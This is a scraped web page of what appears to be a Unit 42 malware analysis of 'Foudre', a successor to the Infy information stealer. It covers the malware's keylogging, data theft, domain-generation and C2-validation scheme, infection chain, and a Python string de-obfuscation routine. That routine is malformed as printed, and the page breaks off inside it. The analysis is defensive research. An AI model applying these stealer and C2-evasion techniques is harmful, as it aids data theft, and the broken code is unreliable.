                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/"><img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" /></a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-98931" class="menu-item menu-item-type-post_type_archive menu-item-object-events menu-item-98931"><a href="https://unit42.paloaltonetworks.com/events/">Speaking Events</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>

  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">Prince of Persia – Ride the Lightning: Infy returns as “Foudre”</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-38809 entry-meta">
			
			
			<span class="post-views-count">18,952</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'38809','like')"><i class="ui ui-2"></i><span class="ml-5">0</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 9</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-prince-persia-ride-lightning-infy-returns-foudre%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-prince-persia-ride-lightning-infy-returns-foudre%2F+-+Prince+of+Persia+%E2%80%93+Ride+the+Lightning%3A+Infy+returns+as+%E2%80%9CFoudre%E2%80%9D" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-prince-persia-ride-lightning-infy-returns-foudre%2F&title=Prince+of+Persia+%E2%80%93+Ride+the+Lightning%3A+Infy+returns+as+%E2%80%9CFoudre%E2%80%9D&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/unit42-prince-persia-ride-lightning-infy-returns-foudre/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/tomer-bar/" title="Posts by Tomer Bar" class="author url fn" rel="author">Tomer Bar</a> and <a href="https://unit42.paloaltonetworks.com/author/simon-conant/" title="Posts by Simon Conant" class="author url fn" rel="author">Simon Conant</a>        </p>
        <p><time datetime="2017-08-01T02:00:17+00:00">August 1, 2017 at 5:00 AM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/unit42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/foudre/" rel="tag">Foudre</a>, <a href="https://unit42.paloaltonetworks.com/tag/infy/" rel="tag">Infy</a>, <a href="https://unit42.paloaltonetworks.com/tag/prince-of-persia/" rel="tag">Prince of Persia</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                      <figure class="mb-30 text-center">
              <img width="650" height="300" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" class="attachment-single size-single wp-post-image" alt="" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg 650w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300-300x138.jpg 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300-370x171.jpg 370w" sizes="(max-width: 650px) 100vw, 650px" />            </figure>
                    <h3>Introduction</h3>
<p>In February 2017, we observed an evolution of the “Infy” malware that we&#8217;re calling &#8220;Foudre&#8221; (&#8220;lightning&#8221;, in French). The actors appear to have learned from our previous takedown and sinkholing of their Command and Control (C2) infrastructure – Foudre incorporates new anti-takeover techniques in an attempt to avoid their C2 domains being sinkholed as we did in 2016.</p>
<p>We documented our <a href="http://researchcenter.paloaltonetworks.com/2016/05/prince-of-persia-infy-malware-active-in-decade-of-targeted-attacks/">original research</a> into the decade-old campaign using the Infy malware in May 2016. A month after publishing that research, we <a href="http://researchcenter.paloaltonetworks.com/2016/06/unit42-prince-of-persia-game-over/">detailed our takeover and sinkholing</a> of the actor’s C2 servers. In July 2016, at Blackhat U.S., Claudio Guarnieri &amp; Collin Anderson <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Guarnieri-Iran-And-The-Soft-War-For-Internet-Dominance-wp.pdf">presented evidence</a> that a subset of the C2 domains redirecting to our sinkhole were blocked by DNS tampering and HTTP filtering by the Telecommunication Company of Iran (AS12880), preventing Iran-domestic access to our sinkhole.</p>
<p>Below, we document these changes to the malware, and highlight some ongoing mistakes and how we leveraged them to learn more about this campaign.</p>
<h3>Foudre</h3>
<p>This new version of Infy uses a window name “Foudre” for keylogging recording (Figure 1).</p>
<p><img class="alignnone size-full wp-image-38812" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_1.png" alt="Princeofpersia_1" width="871" height="661" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_1.png 871w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_1-300x228.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_1-768x583.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_1-370x281.png 370w" sizes="(max-width: 871px) 100vw, 871px" /></p>
<p><em>Figure 1 &#8220;Foudre&#8221; window for keylogging</em></p>
<p>The logic and structure of Foudre is very similar to the original Infy malware. Most of the code remains the original Delphi programming, with an additional crypto library, and a new de-obfuscation algorithm.</p>
<h3>Foudre’s capabilities</h3>
<p>Foudre is, like its Infy predecessors, an information stealer. It includes a keylogger, and captures clipboard contents on a ten-second cycle. It collates system information including process list, installed antivirus, cookies, and other browser data.</p>
<p>The malware checks for internet connectivity simply by looking for an “HTTP 200” response to a connection to google.com. It includes the ability to check for and download any updates to itself.</p>
<p>This “improved Infy” determines the C2 domain name using a Domain Generation Algorithm (DGA). It then validates that the C2 domain is authentic. The C2 returns a signature file, which the malware decrypts and compares it with a locally-stored validation file.</p>
<p>Once the validity of the C2 is confirmed, stolen data is exfiltrated with a simple HTTP POST.</p>
<h3>Infection</h3>
<p>The initial infection vector is a classic spear-phishing email, including a self-executable attachment. When clicked, this executable installs an executable loader, a malware DLL, and a decoy readme file (very typical of Infy).</p>
<p>For first run, the loader calls the DLL with export D1 for setup, creating the installation folder &#8220;%all users%\app data\SnailDriver V&lt;version number&gt;&#8221;. The loader copies itself as “config.exe”, and the DLL with random name (for example “q.d”), to this folder. The version number (for example “1.49”) and DLL name vary between Foudre samples.</p>
<p>The loader writes itself to autostart in the registry. The DLL is loaded by rundll32.exe only after restarting, when the “lp.ini” file in the same folder contains a numeric value.</p>
<p>Foudre uses a similar mechanism as Infy to check if the computer is already infected. It checks for the existence of a specific window “foudre&lt;trojan version number&gt;” with window class “TNRRDPKE”.</p>
<p>The final version of the original Infy malware that we observed was 31. We have so far observed Foudre versions 1 and 2 (Figure 2).</p>
<p><img class="alignnone size-full wp-image-38836" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_2.png" alt="Princeofpersia_2" width="829" height="283" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_2.png 829w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_2-300x102.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_2-768x262.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_2-370x126.png 370w" sizes="(max-width: 829px) 100vw, 829px" /></p>
<p><em>Figure 2 &#8220;Foudre&#8221; version, window exists check mechanism</em></p>
<p>Also embedded is the following German text (Figure 3):</p>
<p style="padding-left: 30px;">&#8220;<em>Sie soll Auskunft über Zschäpes Verhalten in der Untersuchungshaft geben &#8211; daran dürften auch die Opferanwälte Interesse haben.</em>&#8220;</p>
<p>Translated to English:</p>
<p style="padding-left: 30px;">“<em>She is supposed to provide information about Zschaepe&#8217;s behavior in the investigative detention period, which should also be of interest for the victims&#8217; attorneys.</em>”.</p>
<p><img class="alignnone size-full wp-image-38860" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_3.png" alt="Princeofpersia_3" width="958" height="246" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_3.png 958w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_3-900x231.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_3-300x77.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_3-768x197.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_3-370x95.png 370w" sizes="(max-width: 958px) 100vw, 958px" /></p>
<p><em>Figure 3 Embedded German text</em></p>
<p>Beate Zschäpe is a German right-wing extremist and an alleged member of the Neo-Nazi terror group National Socialist Underground (NSU).</p>
<p>The text appears to be copied verbatim from the caption to the first photograph in this news article from February 2017: <a href="http://www.sueddeutsche.de/politik/nsu-prozess-zschaepes-verteidiger-will-jva-beamtin-als-zeugin-hoeren-1.3379516">http://www.sueddeutsche.de/politik/nsu-prozess-zschaepes-verteidiger-will-jva-beamtin-als-zeugin-hoeren-1.3379516</a> (Figure 4).</p>
<p><img class="alignnone size-full wp-image-38884" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_4.png" alt="Princeofpersia_4" width="534" height="492" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_4.png 534w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_4-300x276.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_4-370x341.png 370w" sizes="(max-width: 534px) 100vw, 534px" /></p>
<p><em>Figure 4 Newspaper article source of embedded text</em></p>
<p>We saw similar embedded-text snippets in Infy samples, in German, Dutch, and English. It is unclear what the function of this embedded text is.</p>
<h3>String de-obfuscation</h3>
<p><img class="alignnone size-full wp-image-38908" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_5.png" alt="Princeofpersia_5" width="542" height="517" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_5.png 542w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_5-300x286.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/07/Princeofpersia_5-370x353.png 370w" sizes="(max-width: 542px) 100vw, 542px" /></p>
<p><em>Figure 5 String De-obfuscation function</em></p>
<p>This Python script de-obfuscates a single string:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69287d2de92213081590" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
def decrypt(enc_str):
            index = 0
            xorKey_mul = 1
            xorkey = 0
            dec_str = ""
for i in range (0,len(enc_str)/2):
    	twoByte = enc_str[index:index+2]
   	 index+=2
 	  xorkey = xorKey_mul &amp;gt;&amp;gt; 8 
    	towByte_hex = ord(twoByte.decode('hex'))
    	dec_byte = towByte_hex ^ xorkey
   	 dec_str+=chr(dec_byte)
 	   towByte_hex+= xorKey_mul
 	   xorKey_mul=xorKey_mul*towByte_hex
  	  xorKey_mul= xorKey_mul &amp;amp; 0xffff
 return dec_str</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69287d2de92213081590-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de92213081590-2">2</div><div class="crayon-num" data-line="crayon-5f69287d2de92213081590-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de92213081590-4">4</div><div class="crayon-num" data-line="crayon-5f69287d2de92213081590-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de92213081590-6">6</div><div class="crayon-num" data-line="crayon-5f69287d2de92213081590-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de92213081590-8">8</div><div class="crayon-num" data-line="crayon-5f69287d2de92213081590-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de92213081590-10">10</div><div class="crayon-num" data-line="crayon-5f69287d2de92213081590-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de92213081590-12">12</div><div class="crayon-num" data-line="crayon-5f69287d2de92213081590-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de92213081590-14">14</div><div class="crayon-num" data-line="crayon-5f69287d2de92213081590-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69287d2de92213081590-16">16</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69287d2de92213081590-1"><span class="crayon-e">def </span><span class="crayon-e">decrypt</span><span class="crayon-sy">(</span><span class="crayon-v">enc_str</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de92213081590-2"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">index</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span></div><div class="crayon-line" id="crayon-5f69287d2de92213081590-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">xorKey_mul</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">1</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de92213081590-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">xorkey</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0</span></div><div class="crayon-line" id="crayon-5f69287d2de92213081590-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">dec_str</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de92213081590-6"><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-i">i</span><span class="crayon-h"> </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">range</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-e">len</span><span class="crayon-sy">(</span><span class="crayon-v">enc_str</span><span class="crayon-sy">)</span><span class="crayon-o">/</span><span class="crayon-cn">2</span><span class="crayon-sy">)</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-5f69287d2de92213081590-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;	</span><span class="crayon-v">twoByte</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">enc_str</span><span class="crayon-sy">[</span><span class="crayon-v">index</span><span class="crayon-o">:</span><span class="crayon-v">index</span><span class="crayon-o">+</span><span class="crayon-cn">2</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de92213081590-8"><span class="crayon-h">&nbsp;&nbsp; 	 </span><span class="crayon-v">index</span><span class="crayon-o">+=</span><span class="crayon-cn">2</span></div><div class="crayon-line" id="crayon-5f69287d2de92213081590-9"><span class="crayon-h"> 	&nbsp;&nbsp;</span><span class="crayon-v">xorkey</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">xorKey_mul</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-o">&amp;</span><span class="crayon-v">gt</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-cn">8</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69287d2de92213081590-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;	</span><span class="crayon-v">towByte_hex</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">ord</span><span class="crayon-sy">(</span><span class="crayon-v">twoByte</span><span class="crayon-sy">.</span><span class="crayon-e">decode</span><span class="crayon-sy">(</span><span class="crayon-s">'hex'</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-5f69287d2de92213081590-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;	</span><span class="crayon-v">dec_byte</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">towByte_hex</span><span class="crayon-h"> </span><span class="crayon-o">^</span><span class="crayon-h"> </span><span class="crayon-e">xorkey</span></div><div class="crayon-line crayon-striped-line" 